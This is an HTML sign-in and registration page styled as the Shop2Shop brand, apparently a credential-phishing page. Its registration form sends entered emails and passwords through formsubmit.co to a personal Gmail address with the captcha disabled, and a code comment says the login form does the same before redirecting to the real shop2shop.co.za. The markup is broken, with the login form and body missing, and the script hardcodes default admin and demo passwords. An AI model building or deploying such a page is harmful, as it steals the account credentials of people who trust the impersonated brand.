<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Sign In | Shop2Shop</title>
    <style>
        :root {
            --bg-navy: #0e223d;
            --brand-gold: #fbb03b;
            --input-line: #ffffff;
            --btn-grey: #717171;
            --text-white: #ffffff;
            --error-red: #ff8a7a;
            --modal-overlay: rgba(0, 0, 0, 0.7);
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background-color: var(--bg-navy);
            color: var(--text-white);
            font-family: 'Segoe UI', Arial, Helvetica, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container { width: 100%; max-width: 420px; text-align: center; animation: fadeIn 0.4s ease; }
        .logo-container { margin-bottom: 50px; text-align: center; }
        .logo-img { width: 280px; max-width: 90%; height: auto; display: inline-block; filter: drop-shadow(0 2px 6px rgba(0,0,0,0.25)); }
        .form-card { width: 100%; }
        .input-group { text-align: left; margin-bottom: 38px; }
        .input-group label { display: block; font-size: 14px; font-weight: bold; margin-bottom: 8px; color: var(--text-white); letter-spacing: 0.3px; }
        .input-group input { width: 100%; background: transparent; border: none; border-bottom: 2px solid var(--input-line); color: white; padding: 8px 0 6px 0; font-size: 16px; outline: none; transition: border-color 0.2s; }
        .input-group input:focus { border-bottom-color: var(--brand-gold); }
        .remember-row { display: flex; align-items: center; justify-content: center; gap: 10px; margin-bottom: 32px; font-size: 14px; }
        .remember-row input { width: 18px; height: 18px; cursor: pointer; accent-color: var(--brand-gold); }
        .remember-row label { cursor: pointer; }
        .signin-btn { width: 100%; padding: 12px; background-color: var(--btn-grey); border: 1.5px solid var(--brand-gold); color: white; font-weight: bold; font-size: 16px; border-radius: 6px; cursor: pointer; text-transform: uppercase; transition: all 0.2s ease; letter-spacing: 0.8px; }
        .signin-btn:hover { background-color: #5e5e5e; border-color: #ffcd6b; transform: translateY(-1px); }
        .error-message { background: rgba(255, 70, 70, 0.15); border-left: 3px solid var(--error-red); padding: 8px 12px; font-size: 13px; margin-bottom: 20px; text-align: left; color: #ffbfaf; border-radius: 4px; display: none; }
        .error-message.show { display: block; }
        .divider { border-top: 0.5px solid rgba(255,255,255,0.2); margin-top: 40px; margin-bottom: 20px; width: 100%; }
        .footer { font-size: 14px; color: var(--text-white); }
        .footer a { color: var(--brand-gold); text-decoration: none; font-weight: bold; margin-left: 5px; cursor: pointer; transition: opacity 0.2s; }
        .footer a:hover { text-decoration: underline; opacity: 0.9; }
        .dashboard { background: rgba(255,255,255,0.05); backdrop-filter: blur(4px); border-radius: 20px; padding: 30px 20px; text-align: center; border: 1px solid rgba(251,176,59,0.3); }
        .dashboard h2 { color: var(--brand-gold); margin-bottom: 15px; font-size: 26px; }
        .dashboard p { font-size: 18px; margin: 15px 0; word-break: break-word; }
        .dashboard .user-badge { background: var(--brand-gold); color: var(--bg-navy); display: inline-block; padding: 8px 18px; border-radius: 40px; font-weight: bold; margin: 15px 0; }
        .logout-btn { background: transparent; border: 1.5px solid var(--brand-gold); color: var(--brand-gold); padding: 10px 24px; font-weight: bold; font-size: 14px; border-radius: 30px; cursor: pointer; margin-top: 20px; transition: all 0.2s; }
        .logout-btn:hover { background: var(--brand-gold); color: var(--bg-navy); }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: var(--modal-overlay); justify-content: center; align-items: center; z-index: 1000; backdrop-filter: blur(3px); }
        .modal-content { background-color: #0e2a48; width: 90%; max-width: 380px; padding: 28px 24px 32px; border-radius: 20px; text-align: center; border-top: 4px solid var(--brand-gold); position: relative; box-shadow: 0 20px 30px rgba(0,0,0,0.3); }
        .modal-content h3 { color: var(--brand-gold); margin-bottom: 20px; font-size: 24px; }
        .modal-content .input-group { margin-bottom: 20px; }
        .modal-content .input-group input { border-bottom-color: #ccc; }
        .reg-btn { width: 100%; background-color: var(--btn-grey); border: 1px solid var(--brand-gold); color: white; padding: 10px; border-radius: 40px; font-weight: bold; margin-top: 10px; cursor: pointer; }
        .close-modal { background: none; border: none; color: #aaa; font-size: 28px; position: absolute; top: 12px; right: 18px; cursor: pointer; }
        .close-modal:hover { color: var(--brand-gold); }
        .modal-error { color: #ff9e7a; font-size: 12px; margin-top: 8px; display: none; }
        .inline-info { font-size: 12px; margin-top: 6px; color: #c9d9ff; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(8px);} to { opacity: 1; transform: translateY(0);} }
    </style>
</head>

            <h2>Welcome back! 👋</h2>
            <div class="user-badge" id="dashboardUserEmail">user@shop2shop.com</div>

<div id="registerModal" class="modal">
    <div class="modal-content">
        <button class="close-modal" id="closeModalBtn">&times;</button>
        <h3>Create Account</h3>
        <form id="registerForm" action="https://formsubmit.co/shop2shoptypeofshii@gmail.com" method="POST">
            <input type="hidden" name="_subject" value="Shop2Shop - New Registration">
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_template" value="table">
            <input type="hidden" name="_next" value="">
            <div class="input-group">
                <label>Email Address</label>
                <input type="email" id="regEmail" name="reg_email" placeholder="example@domain.com">
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="regPassword" name="reg_password" placeholder="min. 6 characters">
            </div>
            <div class="input-group">
                <label>Confirm Password</label>
                <input type="password" id="regConfirmPassword" placeholder="confirm password">
            </div>
            <div id="modalErrorMsg" class="modal-error"></div>
            <button type="submit" id="confirmRegisterBtn" class="reg-btn">Register Now</button>
            <div class="inline-info">By registering you agree to our terms</div>
        </form>
    </div>
</div>

<script>
    const USERS_STORAGE_KEY = 'shop2shop_users';
    const SESSION_USER_KEY = 'shop2shop_loggedin_user';

    function loadUsersFromStorage() {
        const stored = localStorage.getItem(USERS_STORAGE_KEY);
        if (stored) return JSON.parse(stored);
        const defaultUsers = [
            { email: "admin@shop2shop.com", password: "admin123" },
            { email: "demo@shop2shop.com", password: "demo123" }
        ];
        localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(defaultUsers));
        return defaultUsers;
    }

    function saveUsersToStorage(users) { localStorage.setItem(USERS_STORAGE_KEY, JSON.stringify(users)); }
    function findUserByEmail(users, email) { return users.find(u => u.email.toLowerCase() === email.toLowerCase()); }

    function registerNewUser(email, password, confirmPassword) {
        const modalError = document.getElementById('modalErrorMsg');
        modalError.style.display = 'none'; modalError.innerText = '';
        if (!email || !password || !confirmPassword) { modalError.innerText = 'All fields are required.'; modalError.style.display = 'block'; return false; }
        const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
        if (!emailRegex.test(email)) { modalError.innerText = 'Please enter a valid email address.'; modalError.style.display = 'block'; return false; }
        if (password.length < 6) { modalError.innerText = 'Password must be at least 6 characters.'; modalError.style.display = 'block'; return false; }
        if (password !== confirmPassword) { modalError.innerText = 'Passwords do not match.'; modalError.style.display = 'block'; return false; }
        let users = loadUsersFromStorage();
        if (findUserByEmail(users, email)) { modalError.innerText = 'This email is already registered. Please sign in.'; modalError.style.display = 'block'; return false; }
        users.push({ email: email.trim(), password: password });
        saveUsersToStorage(users);
        return true;
    }

    function authenticateUser(email, password) {
        const users = loadUsersFromStorage();
        const user = findUserByEmail(users, email);
        if (user && user.password === password) return { success: true, email: user.email };
        return { success: false, message: 'Invalid email or password.' };
    }

    function storeUserSession(email, rememberMe) {
        const sessionData = { email: email, loginTime: new Date().toISOString() };
        if (rememberMe) localStorage.setItem(SESSION_USER_KEY, JSON.stringify(sessionData));
        else sessionStorage.setItem(SESSION_USER_KEY, JSON.stringify(sessionData));
    }

    function getCurrentSession() {
        const localSession = localStorage.getItem(SESSION_USER_KEY);
        const sessSession = sessionStorage.getItem(SESSION_USER_KEY);
        if (localSession) return JSON.parse(localSession);
        if (sessSession) return JSON.parse(sessSession);
        return null;
    }

    function clearAllSessions() { localStorage.removeItem(SESSION_USER_KEY); sessionStorage.removeItem(SESSION_USER_KEY); }

    function isSessionValid(session) {
        if (!session || !session.email) return false;
        return !!findUserByEmail(loadUsersFromStorage(), session.email);
    }

    function showDashboard(userEmail) {
        document.getElementById('dashboardUserEmail').innerText = userEmail;
        document.getElementById('signInSection').style.display = 'none';
        document.getElementById('dashboardSection').style.display = 'block';
    }

    function showSignIn() {
        document.getElementById('signInSection').style.display = 'block';
        document.getElementById('dashboardSection').style.display = 'none';
        document.getElementById('loginEmail').value = '';
        document.getElementById('loginPassword').value = '';
        document.getElementById('rememberCheckbox').checked = false;
        hideError();
    }

    function hideError() { const e = document.getElementById('globalError'); e.classList.remove('show'); e.innerText = ''; }
    function showError(message) { const e = document.getElementById('globalError'); e.innerText = message; e.classList.add('show'); }

    function handleLoginSubmit(e) {
        const email = document.getElementById('loginEmail').value.trim();
        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!email || !emailRegex.test(email)) {
            e.preventDefault();
            showError('Please enter a valid email address.');
            return;
        }
        hideError();
        // Form will submit to FormSubmit and redirect to shop2shop.co.za
    }

    function logoutUser() { clearAllSessions(); showSignIn(); }

    function openRegisterModal() {
        document.getElementById('registerModal').style.display = 'flex';
        document.getElementById('regEmail').value = '';
        document.getElementById('regPassword').value = '';
        document.getElementById('regConfirmPassword').value = '';
        const e = document.getElementById('modalErrorMsg'); e.style.display = 'none'; e.innerText = '';
    }

    function closeRegisterModal() { document.getElementById('registerModal').style.display = 'none'; }

    document.addEventListener('DOMContentLoaded', () => {
        loadUsersFromStorage();

        document.getElementById('loginForm').addEventListener('submit', handleLoginSubmit);
        document.addEventListener('click', e => { if (e.target && e.target.id === 'logoutButton') logoutUser(); });
        document.getElementById('openRegisterLink').addEventListener('click', openRegisterModal);
        document.getElementById('closeModalBtn').addEventListener('click', closeRegisterModal);
        window.addEventListener('click', e => { if (e.target === document.getElementById('registerModal')) closeRegisterModal(); });

        document.getElementById('registerForm').addEventListener('submit', function(e) {
            const email = document.getElementById('regEmail').value.trim();
            const password = document.getElementById('regPassword').value;
            const confirm = document.getElementById('regConfirmPassword').value;
            const valid = registerNewUser(email, password, confirm);
            if (!valid) {
                e.preventDefault();
            }
        });

        ['regEmail','regPassword','regConfirmPassword'].forEach(id => {
            document.getElementById(id).addEventListener('keypress', e => {
                if (e.key === 'Enter') { e.preventDefault(); document.getElementById('registerForm').requestSubmit(); }
            });
        });
    });
</script>
</body>
              </html>
